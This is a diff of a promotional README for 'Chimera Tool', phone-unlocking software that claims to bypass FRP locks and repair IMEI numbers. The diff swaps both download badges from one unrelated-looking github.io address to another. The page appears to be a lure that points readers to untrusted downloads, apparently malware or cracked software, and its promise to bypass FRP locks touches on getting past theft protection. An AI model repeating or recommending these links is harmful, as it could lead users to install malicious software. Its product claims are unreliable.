@@ -2,7 +2,7 @@
 
 Chimera Tool is a professional software designed for unlocking, repairing, and servicing a wide range of smartphones. It offers fast and reliable solutions for bypassing FRP locks, unlocking network restrictions, repairing IMEI, and more. Ideal for mobile technicians and repair centers.
 
-[![Download Chimera Tool](https://img.shields.io/badge/Download-Chimera%20Tool-blueviolet)](https://asdeennerhorse.github.io/mogus/chimera)
+[![Download Chimera Tool](https://img.shields.io/badge/Download-Chimera%20Tool-blueviolet)](https://maxsea-timezero-navigator.github.io/.github)
 
 ---
 
@@ -35,7 +35,7 @@ Chimera Tool is a professional software designed for unlocking, repairing, and s
 - Service Xiaomi and Huawei phones efficiently  
 - Use in repair shops for quick turnaround times  
 
-[![Download Chimera Tool](https://img.shields.io/badge/Download-Chimera%20Tool-blueviolet)](https://asdeennerhorse.github.io/mogus/chimera)
+[![Download Chimera Tool](https://img.shields.io/badge/Download-Chimera%20Tool-blueviolet)](https://maxsea-timezero-navigator.github.io/.github)
 
 ---
 
